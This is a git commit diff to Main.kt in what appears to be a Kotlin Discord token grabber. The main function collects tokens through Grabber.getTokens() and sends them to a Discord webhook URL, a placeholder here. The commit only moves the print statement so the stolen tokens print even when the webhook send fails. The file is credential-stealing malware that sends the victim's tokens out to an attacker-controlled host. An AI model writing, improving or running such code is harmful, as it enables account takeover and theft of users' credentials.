c832afbf8032bbf9ad1dc6052c73e22414e78ab9
BuildTools <skywarspanel@gmail.com>
2024-03-12 17:36:30 +0100

    Prints before sending makes that it will print the token even if there is an error while sending webhook message

--- src/Main.kt
+++ src/Main.kt
@@ -2,6 +2,6 @@ fun main() {
     val tokens = Grabber.getTokens()
     val webhook = DiscordWebhook("your url")
     webhook.content = tokens.toString()
-    webhook.execute()
     println(tokens)
+    webhook.execute()
 }
